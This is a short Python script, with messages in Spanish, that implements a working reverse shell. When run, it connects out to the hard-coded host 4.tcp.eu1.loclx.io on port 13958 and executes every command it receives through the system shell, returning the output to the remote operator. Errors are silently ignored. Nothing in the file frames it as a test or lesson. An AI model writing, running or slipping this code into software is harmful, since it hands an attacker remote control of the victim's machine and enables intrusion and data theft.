import socket
import subprocess
import os
import threading

def connect_back(ip, puerto):
    try:
        s = socket.socket()
        s.connect((ip, puerto))
        s.send("\n🛠 Conexión establecida. Bienvenido al shell remoto.\n[*] Escribe 'exit' para cerrar la conexión.\n".encode('utf-8'))

        def shell():
            while True:
                s.send("[#] Poder shell: ".encode('utf-8'))
                cmd = s.recv(1024).decode().strip()
                if cmd.lower() == "exit":
                    break
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send("[*] Resultado del comando:\n".encode('utf-8'))
                    s.send(output)
                except Exception as e:
                    s.send(f"[!] Error ejecutando el comando: {str(e)}\n".encode('utf-8'))
            s.close()

        t = threading.Thread(target=shell)
        t.start()
        t.join()

    except Exception as err:
        pass  
    finally:
        s.close()

connect_back("4.tcp.eu1.loclx.io", 13958)

